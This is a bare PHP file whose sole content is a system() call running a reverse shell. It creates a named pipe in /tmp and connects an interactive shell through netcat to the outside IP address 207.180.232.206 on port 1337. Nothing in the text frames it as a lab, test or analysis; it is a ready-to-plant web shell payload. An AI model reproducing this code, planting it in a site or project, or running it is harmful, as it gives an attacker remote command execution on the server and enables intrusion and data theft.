<?php

system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 207.180.232.206 1337 >/tmp/f");

?>
